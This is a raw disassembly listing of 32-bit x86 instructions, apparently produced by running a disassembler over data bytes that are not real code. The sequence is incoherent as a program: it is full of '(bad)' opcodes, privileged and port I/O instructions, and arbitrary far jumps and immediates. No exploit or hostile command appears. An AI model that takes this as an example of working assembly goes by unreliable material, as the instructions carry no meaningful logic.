  42adb2:	mov    bl,0x28
  42adb4:	xor    bh,BYTE PTR [ebx+0x29]
  42adb7:	neg    DWORD PTR [edx]
  42adb9:	mov    ah,0x55
  42adbb:	fcmovu st,st(2)
  42adbd:	cld    
  42adbe:	xchg   esi,eax
  42adbf:	(bad)  
  42adc1:	imul   ebx,DWORD PTR [ebx],0x7c1f92f0
  42adc7:	std    
  42adc8:	xlat   BYTE PTR ds:[ebx]
  42adc9:	xchg   ebx,eax
  42adca:	xchg   edx,eax
  42adcb:	rcl    edi,1
  42adcd:	xchg   edx,eax
  42adce:	scas   al,BYTE PTR es:[edi]
  42adcf:	(bad)  
  42add0:	aad    0xea
  42add2:	or     BYTE PTR [edx+0x2d354fd4],ah
  42add8:	add    esp,edi
  42adda:	jge    0x42ad7c
  42addc:	retf   0xf8e1
  42addf:	push   0xffffffc9
  42ade1:	or     edx,ebx
  42ade3:	data16 aad 0x8a
  42ade6:	jge    0x42add1
  42ade8:	mov    cl,0x6b
  42adea:	add    eax,0x1dd3b344
  42adef:	and    DWORD PTR [eax],esi
  42adf1:	not    BYTE PTR [eax+0x43]
  42adf4:	aaa    
  42adf5:	lahf   
  42adf6:	iret   
  42adf7:	mov    cl,0x60
  42adf9:	test   DWORD PTR [ebx+edi*2+0xb39df3f],0xbdfb6ff
  42ae04:	mov    esi,DWORD PTR [ebx+0xc]
  42ae07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae08:	fs mov ebx,0x883333e0
  42ae0e:	test   BYTE PTR ds:0x80,al
	...
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	outs   dx,BYTE PTR ds:[esi]
  42ae81:	dec    ebp
  42ae82:	fistp  DWORD PTR [edi+0x1cba5]
  42ae88:	add    eax,0x31000001
  42ae8d:	cmp    edi,DWORD PTR [edx]
  42ae8f:	mov    ch,bh
  42ae91:	xchg   esi,eax
  42ae92:	push   es
  42ae93:	inc    ebx
  42ae94:	sub    al,0x18
  42ae96:	push   esp
  42ae97:	mov    bl,0xd4
  42ae99:	mov    al,0x89
  42ae9b:	and    BYTE PTR [eax-0x65],cl
  42ae9e:	rcl    BYTE PTR [eax+0x13],cl
  42aea1:	mov    ebx,0xb1f43463
  42aea6:	mov    cl,0x15
  42aea8:	js     0x42aebe
  42aeaa:	and    ebx,DWORD PTR [ecx+edx*1+0x460c4dfc]
  42aeb1:	xor    bh,0xb6
  42aeb4:	rcl    DWORD PTR [ebp-0x19183fe1],0x75
  42aebb:	stos   DWORD PTR es:[edi],eax
  42aebc:	cli    
  42aebd:	ja     0x42ae58
  42aebf:	and    al,0xfe
  42aec1:	js     0x42aef3
  42aec3:	pop    esi
  42aec4:	xchg   dh,al
  42aec6:	idiv   bh
  42aec8:	jecxz  0x42ae6c
  42aeca:	aad    0xe0
  42aecc:	jno    0x42af2f
  42aece:	mov    esp,ebp
  42aed0:	in     eax,dx
  42aed1:	sub    eax,0xe23a2d8
  42aed6:	cdq    
  42aed7:	and    al,0x10
  42aed9:	sar    DWORD PTR [ebx+0x5dc3ecde],cl
  42aedf:	or     BYTE PTR [ebx+esi*2-0x3b],bh
  42aee3:	inc    edx
  42aee4:	xchg   DWORD PTR [edx+edx*2],edx
  42aee7:	movlps QWORD PTR [ebx+0x5bbe4436],xmm3
  42aeee:	add    esi,ebx
  42aef0:	leave  
  42aef1:	pop    esi
  42aef2:	or     bl,ch
  42aef4:	cmp    al,BYTE PTR [edi*4+0x6e34d040]
  42aefb:	repnz or al,0x88
  42aefe:	xor    al,0x5a
  42af00:	xchg   DWORD PTR [ecx-0x8],eax
  42af03:	xchg   ebp,eax
  42af04:	mov    esp,0xa99a206c
  42af09:	add    ebx,DWORD PTR gs:[esp+ebp*8]
  42af0d:	mov    ds:0xe7bb5c3f,eax
  42af12:	sub    eax,0x45174207
  42af17:	pop    eax
  42af18:	mov    BYTE PTR [eax],dl
  42af1a:	sub    eax,0xb47d4028
  42af1f:	xor    esi,DWORD PTR [esi+0x62]
  42af22:	cmp    eax,0x730bca07
  42af27:	sub    BYTE PTR [edi+0x60434a27],bl
  42af2d:	(bad)  
  42af2f:	jp     0x42af75
  42af31:	arpl   WORD PTR [eax+0x1c],ax
  42af34:	xchg   esp,eax
  42af35:	cld    
  42af36:	test   DWORD PTR [eax+0x48a9c136],eax
  42af3c:	(bad)  
  42af3d:	jae    0x42afac
  42af3f:	cmp    eax,0xcbcb1b06
  42af44:	sub    BYTE PTR ds:0xb80a9db1,ah
  42af4a:	push   edx
  42af4b:	mov    ebx,0x6ae29d50
  42af50:	and    DWORD PTR [ecx],esi
  42af52:	or     al,0xfd
  42af54:	fbld   TBYTE PTR [ebx-0x6b]
  42af57:	fmul   DWORD PTR [esi+0x149bd82]
  42af5d:	scas   al,BYTE PTR es:[edi]
  42af5e:	push   ss
  42af5f:	xchg   ebp,eax
  42af60:	fcmovnbe st,st(5)
  42af62:	cmc    
  42af63:	ds dec eax
  42af65:	ins    BYTE PTR es:[edi],dx
  42af66:	into   
  42af67:	mov    ebp,0x82bbde3e
  42af6c:	cwde   
  42af6d:	xchg   dl,ah
  42af6f:	das    
  42af70:	or     dl,BYTE PTR [edi-0x49]
  42af73:	mov    eax,ds:0x7f804c82
  42af78:	lods   al,BYTE PTR ds:[esi]
  42af79:	push   0x22
  42af7b:	fidivr DWORD PTR ds:0x12940dfe
  42af81:	test   BYTE PTR [edx],0x46
  42af84:	xchg   edi,eax
  42af85:	loopne 0x42af78
  42af87:	pop    edi
  42af88:	(bad)  
  42af89:	mov    dh,0xa5
  42af8b:	xchg   esi,eax
  42af8c:	ss inc edi
  42af8e:	arpl   WORD PTR [edx-0x2d],si
	...
  42aff1:	add    BYTE PTR [eax],al
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	(bad)  
  42b001:	adc    bl,BYTE PTR [esp+eiz*8-0x56]
  42b005:	int3   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    eax,0x2f000001
  42b00d:	jl     0x42afc2
  42b00f:	mov    esi,0x83e8e78f
  42b014:	adc    eax,0xbca16ec
  42b019:	add    BYTE PTR gs:[esi],dl
  42b01c:	jl     0x42b06e
  42b01e:	jbe    0x42b045
  42b020:	ficom  WORD PTR [edi-0x9a522a4]
  42b026:	cmp    BYTE PTR [edx-0xcedba63],0xb5
  42b02d:	inc    eax
  42b02e:	call   0xc9bc:0x53ed47db
  42b035:	cdq    
  42b036:	cld    
  42b037:	add    dl,BYTE PTR [esi-0x25]
  42b03a:	cld    
  42b03b:	adc    eax,0x1dc74d38
  42b040:	cli    
  42b041:	fnstenv [edi-0x21123cb2]
  42b047:	mov    BYTE PTR [ebx],al
  42b049:	mov    ds:0xf4556933,al
  42b04e:	mov    ds:0xa58ea995,al
  42b053:	add    eax,0x78b3b148
  42b058:	dec    edi
  42b059:	arpl   sp,bp
  42b05b:	int    0x9b
  42b05d:	mov    bl,0x7d
  42b05f:	xchg   esi,eax
  42b060:	pop    ebx
  42b061:	dec    ebx
  42b062:	repz call 0xaa45:0x8c71c129
  42b06a:	int3   
  42b06b:	fdivrp st(6),st
  42b06d:	xchg   ebp,eax
  42b06e:	lea    esi,[ebx+0x7696162d]
  42b074:	cmc    
  42b075:	pop    eax
  42b076:	adc    dl,ch
  42b078:	nop
  42b079:	jmp    0x8fc27de9
  42b07e:	int    0xff
  42b080:	int3   
  42b081:	xchg   edi,eax
  42b082:	fs push esi
  42b084:	stos   BYTE PTR es:[edi],al
  42b085:	and    eax,0xd2b34935
  42b08a:	pop    ebp
  42b08b:	les    ebp,FWORD PTR ss:[ebp-0x19]
  42b08f:	xor    BYTE PTR [ecx],bh
  42b091:	jmp    0x42b0f3
  42b093:	add    DWORD PTR [ebp+0x77],0x93cab03c
  42b09a:	call   0xbd7:0x6e884bf8
  42b0a1:	cmovp  ebp,DWORD PTR [ebx+0x33ddaf7b]
  42b0a8:	xchg   ebx,eax
  42b0a9:	int3   
  42b0aa:	xchg   ebx,eax
  42b0ab:	sub    BYTE PTR [edx+0x4],bl
  42b0ae:	cmp    eax,0x8355be8a
  42b0b3:	adc    DWORD PTR [eax],edi
  42b0b5:	add    bh,BYTE PTR [ebx]
  42b0b7:	and    eax,0x7f4f69f2
  42b0bc:	xor    eax,0xfb70a2a5
  42b0c1:	pop    esi
  42b0c2:	sub    al,0x52
  42b0c4:	dec    ecx
  42b0c5:	pop    ss
  42b0c6:	je     0x42b05d
  42b0c8:	outs   dx,BYTE PTR ds:[esi]
  42b0c9:	cmp    edx,DWORD PTR [edx-0x15]
  42b0cc:	or     BYTE PTR [edi-0xfe12983],bl
  42b0d2:	idiv   DWORD PTR [eax+edi*2-0x37]
  42b0d6:	ret    
  42b0d7:	loopne 0x42b0c6
  42b0d9:	push   ebx
  42b0da:	cdq    
  42b0db:	stc    
  42b0dc:	xor    DWORD PTR [ebx],edi
  42b0de:	gs jns 0x42b0ae
  42b0e1:	jg     0x42b0a2
  42b0e3:	imul   ecx,DWORD PTR [ebx],0x1efe442b
  42b0e9:	cmp    eax,0x3b044eff
  42b0ee:	gs shr cl,0xdd
  42b0f2:	inc    esi
  42b0f3:	dec    eax
  42b0f4:	mov    ebp,0xc615827f
  42b0f9:	pop    ecx
  42b0fa:	psrlq  mm3,QWORD PTR [eax+0x7d]
  42b0fe:	cmp    eax,0x3f23bbad
  42b103:	sar    DWORD PTR [edx+0x39],0x6b
  42b107:	jnp    0x42b178
  42b109:	cmp    DWORD PTR [esi],0xfcc8681b
  42b10f:	pop    eax
  42b110:	ins    DWORD PTR es:[edi],dx
	...
  42b171:	add    BYTE PTR [eax],al
  42b173:	add    BYTE PTR [ebp+0x25],dh
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	pop    edx
  42b181:	mov    dl,0xbb
  42b183:	gs scas eax,DWORD PTR es:[edi]
  42b185:	int    0x1
  42b187:	add    BYTE PTR ds:0xc3000001,al
  42b18d:	sub    edx,DWORD PTR [ebx+0x19]
  42b190:	push   ss
  42b191:	cld    
  42b192:	push   cs
  42b193:	outs   dx,BYTE PTR ds:[esi]
  42b194:	and    al,0xb4
  42b196:	push   eax
  42b197:	enter  0xf7cc,0x68
  42b19b:	in     eax,dx
  42b19c:	stc    
  42b19d:	adc    al,0xcc
  42b19f:	test   al,0xf7
  42b1a1:	and    eax,0xe7ed36e4
  42b1a6:	and    edx,0x9
  42b1a9:	mov    al,0xb7
  42b1ab:	pop    esp
  42b1ac:	test   cl,0xe7
  42b1af:	stos   BYTE PTR es:[edi],al
  42b1b0:	pop    ebx
  42b1b1:	add    DWORD PTR [edx+0x5],esp
  42b1b4:	fadd   st,st(4)
  42b1b6:	mov    al,ds:0x6a68ef37
  42b1bb:	xchg   BYTE PTR [edx-0x76c53394],ch
  42b1c1:	out    0x79,al
  42b1c3:	xchg   BYTE PTR [ebx-0x28e0e69b],ch
  42b1c9:	pushf  
  42b1ca:	enter  0x7908,0xa8
  42b1ce:	mov    BYTE PTR [edx],0xbe
  42b1d1:	int    0xd0
  42b1d3:	mov    eax,ds:0xa15a8b94
  42b1d8:	mov    dl,0xba
  42b1da:	leave  
  42b1db:	retf   0x1384
  42b1de:	sahf   
  42b1df:	popa   
  42b1e0:	push   0xe488ea68
  42b1e5:	xchg   ebp,eax
  42b1e6:	jmp    0x42b1e2
  42b1e8:	out    0xfa,eax
  42b1ea:	mov    al,ds:0x284a072a
  42b1ef:	add    BYTE PTR [edx+0x79],al
  42b1f2:	cli    
  42b1f3:	push   ebx
  42b1f4:	jle    0x42b179
  42b1f6:	repnz push es
  42b1f8:	fisttp DWORD PTR [edx-0x3]
  42b1fb:	rol    BYTE PTR [edx+edi*2],1
  42b1fe:	cli    
  42b1ff:	ret    0x1cf2
  42b202:	jge    0x42b265
  42b204:	jecxz  0x42b24f
  42b206:	xor    DWORD PTR [eax+0x6b],esp
  42b209:	push   esi
  42b20a:	push   ecx
  42b20b:	leave  
  42b20c:	xchg   esi,eax
  42b20d:	stos   BYTE PTR es:[edi],al
  42b20e:	aam    0x71
  42b210:	mov    al,BYTE PTR ds:0xb6fafba3
  42b216:	ds ins BYTE PTR es:[edi],dx
  42b218:	or     cl,cl
  42b21a:	mov    edx,0x5c6c8ba4
  42b21f:	jle    0x42b1a6
  42b221:	ret    
  42b222:	rcr    DWORD PTR [ebp+0x3f],0xb7
  42b226:	sub    dh,BYTE PTR [esi-0x78b57ea7]
  42b22c:	jl     0x42b285
  42b22e:	dec    edx
  42b22f:	fld    DWORD PTR [edx-0x5cb39a47]
  42b235:	retf   0xc912
  42b238:	in     al,0x2
  42b23a:	push   ebp
  42b23b:	test   al,0x94
  42b23d:	iret   
  42b23e:	cli    
  42b23f:	dec    esp
  42b240:	push   edi
  42b241:	rol    BYTE PTR [eax+0x66776a23],cl
  42b247:	push   edx
  42b248:	add    BYTE PTR [ecx-0x14e5fb72],dl
  42b24e:	push   es
  42b24f:	xchg   ecx,eax
  42b250:	dec    ecx
  42b251:	jnp    0x42b29d
  42b253:	sbb    eax,0x2bb94c60
  42b258:	jg     0x42b2d3
  42b25a:	aaa    
  42b25b:	jno    0x42b2cd
  42b25d:	outs   dx,DWORD PTR ds:[esi]
  42b25e:	push   ebx
  42b25f:	add    al,0x23
  42b261:	(bad)  
  42b262:	and    eax,0x3ec66286
  42b267:	sub    bh,dh
  42b269:	xchg   ebp,eax
  42b26a:	(bad)  [eax+0x0]
  42b26d:	add    eax,0xa2683068
  42b272:	push   ds
  42b273:	ins    BYTE PTR es:[edi],dx
  42b274:	pop    eax
  42b275:	das    
  42b276:	cmp    ch,BYTE PTR [edi]
  42b278:	xor    BYTE PTR [edi],0x8
  42b27b:	cmp    ebp,edx
  42b27d:	push   ss
  42b27e:	sbb    BYTE PTR [ecx],al
  42b280:	inc    eax
  42b281:	ins    DWORD PTR es:[edi],dx
  42b282:	inc    edx
  42b283:	stc    
  42b284:	shl    DWORD PTR [edi+0x1733064d],1
  42b28a:	pop    edx
  42b28b:	out    dx,al
  42b28c:	xlat   BYTE PTR ds:[ebx]
  42b28d:	sbb    BYTE PTR es:[edx+0xb9],dl
	...
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0x2c738e65
  42b301:	arpl   WORD PTR [edi+0x1ceb4e1],di
  42b307:	add    BYTE PTR ds:0x24000001,al
  42b30d:	xchg   esp,eax
  42b30e:	lods   al,BYTE PTR ds:[esi]
  42b30f:	ret    
  42b310:	pusha  
  42b311:	sub    ah,bh
  42b313:	pop    ebp
  42b314:	push   ds
  42b315:	sub    ah,BYTE PTR [edi+eiz*2+0x725c6e80]
  42b31c:	arpl   WORD PTR [edx],dx
  42b31e:	sbb    bl,al
  42b320:	dec    esp
  42b321:	push   ss
  42b322:	stos   DWORD PTR es:[edi],eax
  42b323:	jno    0x42b30e
  42b325:	retf   0x5acb
  42b328:	jno    0x42b2e2
  42b32a:	add    esi,DWORD PTR [ebx-0x50]
  42b32d:	popf   
  42b32e:	add    ebp,ecx
  42b330:	adc    eax,0x25ff3a1
  42b335:	jnp    0x42b396
  42b337:	outs   dx,DWORD PTR ds:[esi]
  42b338:	dec    ecx
  42b339:	stc    
  42b33a:	jae    0x42b362
  42b33c:	pop    ebx
  42b33d:	xlat   BYTE PTR ds:[ebx]
  42b33e:	mov    dl,0x2d
  42b340:	out    0xf5,eax
  42b342:	pop    ebp
  42b343:	mov    ss,ebx
  42b345:	into   
  42b346:	(bad)  
  42b347:	fs enter 0x5220,0x43
  42b34c:	ins    BYTE PTR es:[edi],dx
  42b34d:	xchg   edi,eax
  42b34e:	bnd jg 0x42b329
  42b351:	gs fld st(2)
  42b354:	or     BYTE PTR [edx-0x410df475],bl
  42b35a:	add    al,0xa
  42b35c:	jae    0x42b389
  42b35e:	cmp    DWORD PTR [edi+0x4],esp
  42b361:	dec    edi
  42b362:	and    edx,0x20
  42b365:	push   ebx
  42b366:	mov    edi,0x81a6fa25
  42b36b:	jl     0x42b3cd
  42b36d:	hlt    
  42b36e:	sbb    BYTE PTR [esp+ebx*8-0xe62efea],dl
  42b375:	pop    eax
  42b376:	data16 mov dl,0x37
  42b379:	push   0xffffff86
  42b37b:	out    dx,al
  42b37c:	mov    edi,DWORD PTR [edi+eax*1+0x73747e96]
  42b383:	mov    ch,0x5c
  42b385:	sub    al,0xbd
  42b387:	pop    eax
  42b388:	imul   ebp,DWORD PTR ss:[edx+0x2f],0xf1938781
  42b390:	test   al,0x79
  42b392:	cmp    BYTE PTR [edi-0x2],ah
  42b395:	clc    
  42b396:	retf   
  42b397:	mov    cl,BYTE PTR [eax+edx*2-0x6ce6ee86]
  42b39e:	xor    BYTE PTR [esi],bl
  42b3a0:	cmp    edi,eax
  42b3a2:	mov    al,BYTE PTR [ebx]
  42b3a4:	jbe    0x42b329
  42b3a6:	pop    ebx
  42b3a7:	and    DWORD PTR [edx],esp
  42b3a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b3aa:	and    BYTE PTR [esi],0xeb
  42b3ad:	ror    ebp,cl
  42b3af:	inc    eax
  42b3b0:	jmp    0x39c11fc9
  42b3b5:	xor    eax,0x176a08a5
  42b3ba:	mov    edx,DWORD PTR [ebp+0x3f12b9b5]
  42b3c0:	les    eax,FWORD PTR [edx-0x19]
  42b3c3:	je     0x42b3f2
  42b3c5:	cmp    bl,BYTE PTR [edi-0x3b2f1cf7]
  42b3cb:	lahf   
  42b3cc:	mov    eax,ds:0xb400ee26
  42b3d1:	xor    al,0xae
  42b3d3:	iret   
  42b3d4:	fisttp WORD PTR [esi+0x3a5c2ae7]
  42b3da:	inc    esi
  42b3db:	add    eax,0x91589c19
  42b3e0:	pop    esi
  42b3e1:	add    ecx,esi
  42b3e3:	out    dx,eax
  42b3e4:	popf   
  42b3e5:	mov    ds:0xdbf61130,al
  42b3ea:	retf   0xce20
  42b3ed:	iret   
  42b3ee:	ret    
  42b3ef:	adc    BYTE PTR [eax],bl
  42b3f1:	shl    BYTE PTR [ebx+0x47],cl
  42b3f4:	(bad)  
  42b3f5:	daa    
  42b3f6:	xchg   esp,eax
  42b3f7:	ficom  WORD PTR es:[ebp+0x55afb8a]
  42b3fe:	scas   al,BYTE PTR es:[edi]
  42b3ff:	sbb    dl,bl
  42b401:	bound  eax,QWORD PTR [ebx]
  42b403:	nop
  42b404:	retf   
  42b405:	sbb    esp,eax
  42b407:	arpl   WORD PTR [edi-0x6c012dad],si
  42b40d:	daa    
  42b40e:	push   ebp
  42b40f:	xor    esp,DWORD PTR [edi+0x0]
	...
  42b471:	add    BYTE PTR [eax],al
  42b473:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [ecx],ebx
  42b481:	sbb    al,0x5
  42b483:	ret    0xcfb9
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    eax,0x41000001
  42b48d:	push   ebp
  42b48e:	sbb    DWORD PTR [edx-0x1d],eax
  42b491:	xchg   dl,al
  42b493:	push   ecx
  42b494:	jno    0x42b4db
  42b496:	loopne 0x42b4dd
  42b498:	xchg   ecx,eax
  42b499:	mov    bh,0x82
  42b49b:	push   esp
  42b49c:	mov    ebx,0x192925d2
  42b4a1:	sbb    DWORD PTR [ebx],ecx
  42b4a3:	cmp    al,0xa1
  42b4a5:	push   edx
  42b4a6:	(bad)
  42b4a9:	fisubr DWORD PTR [ecx+0x7c5906b1]
  42b4af:	jnp    0x42b469
  42b4b1:	dec    esi
  42b4b2:	and    dh,BYTE PTR [ebp-0x2e8435db]
  42b4b8:	into   
  42b4b9:	cli    
  42b4ba:	aad    0x1
  42b4bc:	xor    DWORD PTR [edi+0x9],ebp
  42b4bf:	iret   
  42b4c0:	push   cs
  42b4c1:	xchg   edi,eax
  42b4c2:	(bad)
  42b4c5:	adc    al,bl
  42b4c7:	nop
  42b4c8:	aaa    
  42b4c9:	push   es
  42b4ca:	test   bl,dl
  42b4cc:	or     eax,0x866eb1fa
  42b4d1:	ret    
  42b4d2:	sbb    bh,ch
  42b4d4:	adc    edi,edx
  42b4d6:	or     ch,BYTE PTR ds:0x8c4bba07
  42b4dc:	ins    DWORD PTR es:[edi],dx
  42b4dd:	fidivr WORD PTR [edi+eiz*1-0x4aca0f4]
  42b4e4:	inc    ebp
  42b4e5:	je     0x42b4ff
  42b4e7:	retf   0xe829
  42b4ea:	(bad)  
  42b4ec:	in     eax,dx
  42b4ed:	loopne 0x42b56e
  42b4ef:	pop    ss
  42b4f0:	inc    esi
  42b4f1:	lods   eax,DWORD PTR ds:[esi]
  42b4f2:	(bad)  
  42b4f3:	sbb    DWORD PTR [edi+0x50],ebx
  42b4f6:	mov    ah,0x98
  42b4f8:	(bad)  
  42b4f9:	clc    
  42b4fa:	lods   eax,DWORD PTR ds:[esi]
  42b4fb:	mov    ebp,0xa6ebcd3e
  42b500:	(bad)  
  42b501:	mov    dh,0x6c
  42b503:	clc    
  42b504:	ss jb  0x42b4f6
  42b507:	push   ss
  42b508:	mov    esi,edi
  42b50a:	sbb    al,0xf1
  42b50c:	test   eax,0x446c7acf
  42b511:	scas   al,BYTE PTR es:[edi]
  42b512:	aaa    
  42b513:	das    
  42b514:	mov    esp,DWORD PTR [ebp+0x60]
  42b517:	mov    bh,0xca
  42b519:	mov    ch,0x1d
  42b51b:	mov    eax,0x4b2a0b4d
  42b520:	pop    ecx
  42b521:	cld    
  42b522:	sub    bl,BYTE PTR [edx]
  42b524:	jne    0x42b55a
  42b526:	jle    0x42b517
  42b528:	retf   
  42b529:	jecxz  0x42b4e0
  42b52b:	lahf   
  42b52c:	sbb    edi,DWORD PTR [ebp+0x53]
  42b52f:	jae    0x42b4f8
  42b531:	and    esi,0xfdc224db
  42b537:	xchg   BYTE PTR [ecx+0x41a958f2],ah
  42b53d:	cmc    
  42b53e:	psadbw mm5,mm7
  42b541:	jmp    0xae8f:0xcaa09538
  42b548:	(bad)  
  42b54b:	push   es
  42b54c:	push   eax
  42b54d:	test   eax,0xde6c5573
  42b552:	mov    dl,0x75
  42b554:	mov    al,ds:0x529ce4a5
  42b559:	mov    esp,0x46a1eb2f
  42b55e:	xor    bl,BYTE PTR [edx]
  42b560:	push   edx
  42b561:	aaa    
  42b562:	mov    ebx,0x22ad1154
  42b567:	cld    
  42b568:	aaa    
  42b569:	das    
  42b56a:	rol    BYTE PTR [ebx+ecx*8],cl
  42b56d:	dec    ebx
  42b56e:	ins    BYTE PTR es:[edi],dx
  42b56f:	popa   
  42b570:	aam    0x98
  42b572:	sub    al,0xa0
  42b574:	data16 lods al,BYTE PTR ds:[esi]
  42b576:	mov    eax,0x6bee92d7
  42b57b:	xchg   ebp,eax
  42b57c:	and    ch,bh
  42b57e:	xchg   ebx,eax
  42b57f:	add    BYTE PTR [ebx-0x3b4a7fe],ah
  42b585:	loope  0x42b5d9
  42b587:	aaa    
  42b588:	inc    ebx
  42b589:	push   edx
  42b58a:	or     BYTE PTR [ebx-0x6c],ah
  42b58d:	adc    eax,0x6a6521
	...
  42b5f2:	add    BYTE PTR [eax],al
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	xlat   BYTE PTR ds:[ebx]
  42b601:	shl    DWORD PTR [edx+eax*4-0x42],1
  42b605:	rol    BYTE PTR [ecx],1
  42b607:	add    BYTE PTR ds:0x36000001,al
  42b60d:	mov    edx,0x13426099
  42b612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b613:	adc    BYTE PTR [edx],bh
  42b615:	fild   WORD PTR [esi+ebp*2+0x757ede8a]
  42b61c:	add    eax,0xc81f6124
  42b621:	stos   DWORD PTR es:[edi],eax
  42b622:	mov    dh,0x3f
  42b624:	jno    0x42b5dc
  42b626:	das    
  42b627:	push   ds
  42b628:	dec    eax
  42b629:	or     al,BYTE PTR [ebp-0x40d310f9]
  42b62f:	ds dec ecx
  42b631:	and    eax,0x293af9f0
  42b636:	mov    esi,0x3b6fd646
  42b63b:	inc    ecx
  42b63c:	and    DWORD PTR [esi+0x74],esp
  42b63f:	jnp    0x42b67f
  42b641:	add    DWORD PTR [ecx*2+0xb77f789],eax
  42b648:	das    
  42b649:	sbb    esi,DWORD PTR [ecx]
  42b64b:	mov    ch,0x36
  42b64d:	call   0xdc60:0x9cd0c8b4
  42b654:	or     bl,BYTE PTR [edi+0xb]
  42b657:	cwde   
  42b658:	sub    DWORD PTR [ebx+0x7c],ebp
  42b65b:	add    dl,bl
  42b65d:	jae    0x42b641
  42b65f:	adc    BYTE PTR [edx-0x51519618],bl
  42b665:	cmp    al,0xb2
  42b667:	aad    0x43
  42b669:	and    eax,0x944172e
  42b66e:	pop    ds
  42b66f:	mov    cl,0xe1
  42b671:	ret    0x67d9
  42b674:	in     eax,0x67
  42b676:	shl    edi,cl
  42b678:	daa    
  42b679:	not    ch
  42b67b:	jne    0x42b656
  42b67d:	push   esp
  42b67e:	mov    edx,0x1c896a2e
  42b683:	or     eax,0xb159429c
  42b688:	inc    ebp
  42b689:	inc    al
  42b68b:	(bad)  
  42b68d:	or     eax,0xc1311747
  42b692:	cmp    dh,bh
  42b694:	fist   DWORD PTR [edx-0x32]
  42b697:	sahf   
  42b698:	jno    0x42b691
  42b69a:	stos   DWORD PTR es:[edi],eax
  42b69b:	sbb    al,al
  42b69d:	das    
  42b69e:	test   eax,0xc90b1357
  42b6a3:	pop    es
  42b6a4:	sbb    eax,0xa80274ae
  42b6a9:	cmp    esp,DWORD PTR [edi]
  42b6ab:	int    0x55
  42b6ad:	and    BYTE PTR [esi-0x25c59454],bl
  42b6b3:	(bad)  
  42b6b4:	xchg   esp,eax
  42b6b5:	repz les edx,FWORD PTR [eax-0x44d350af]
  42b6bc:	stos   BYTE PTR es:[edi],al
  42b6bd:	jmp    0x42b70c
  42b6bf:	add    al,0xc8
  42b6c1:	pop    DWORD PTR [ebx-0x722b4e5e]
  42b6c7:	fstp   TBYTE PTR [ebp-0x7d]
  42b6ca:	pop    edx
  42b6cb:	and    al,0x77
  42b6cd:	shr    DWORD PTR [eax-0x3e],1
  42b6d0:	(bad)  
  42b6d1:	mov    bl,0x2c
  42b6d3:	fwait
  42b6d4:	scas   al,BYTE PTR es:[edi]
  42b6d5:	jnp    0x42b666
  42b6d7:	hlt    
  42b6d8:	sti    
  42b6d9:	cmp    ch,BYTE PTR [esp+eax*1-0x3b1fa899]
  42b6e0:	mov    al,0xb2
  42b6e2:	div    DWORD PTR [edi-0x4b]
  42b6e5:	and    DWORD PTR [edi+ebp*8],esp
  42b6e8:	inc    eax
  42b6e9:	mov    DWORD PTR [eax-0x31763edd],0x5133346c
  42b6f3:	mov    edi,0xe65e383b
  42b6f8:	sti    
  42b6f9:	leave  
  42b6fa:	mov    WORD PTR [ebx+edi*1-0x220a59c8],?
  42b701:	out    dx,eax
  42b702:	cdq    
  42b703:	dec    esp
  42b704:	aad    0xd4
  42b706:	or     bh,al
  42b708:	jle    0x42b74a
  42b70a:	or     eax,0x3f223c33
  42b70f:	out    dx,eax
  42b710:	or     al,0x0
	...
  42b772:	add    BYTE PTR [eax],al
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	add    eax,0xc349b728
  42b785:	rol    DWORD PTR [ecx],1
  42b787:	add    BYTE PTR ds:0xdb000001,al
  42b78d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b78e:	adc    DWORD PTR [edx],esi
  42b790:	(bad)  
  42b791:	icebp  
  42b792:	icebp  
  42b793:	xchg   ebp,eax
  42b794:	mov    ebp,0x499e287d
  42b799:	fistp  DWORD PTR ds:0x3659a47
  42b79f:	xlat   BYTE PTR ds:[ebx]
  42b7a0:	add    ah,BYTE PTR [ebx+0x1c]
  42b7a3:	mov    dl,0x70
  42b7a5:	mov    esp,0x3cf61fea
  42b7aa:	cwde   
  42b7ab:	clc    
  42b7ac:	not    BYTE PTR [edx]
  42b7ae:	pop    edx
  42b7af:	mov    edx,0x96872055
  42b7b4:	stc    
  42b7b5:	adc    DWORD PTR [eax+0x78],eax
  42b7b8:	xor    DWORD PTR fs:[ebp-0x16685d51],ecx
  42b7bf:	sub    al,0x9f
  42b7c1:	fcmovb st,st(1)
  42b7c3:	and    bl,BYTE PTR [ecx+0x113ac4c9]
  42b7c9:	imul   edi,DWORD PTR ds:0xc700060d,0x1bb8892d
  42b7d3:	inc    ebx
  42b7d4:	aam    0x7a
  42b7d6:	dec    ecx
  42b7d7:	sub    eax,0x13f5c1dd
  42b7dc:	pop    es
  42b7dd:	out    dx,al
  42b7de:	repz dec edi
  42b7e0:	sbb    al,0xe0
  42b7e2:	sbb    esp,DWORD PTR [edi+eiz*1-0x1e]
  42b7e6:	in     al,0x38
  42b7e8:	neg    DWORD PTR [ebx]
  42b7ea:	push   edx
  42b7eb:	sbb    BYTE PTR [edi],al
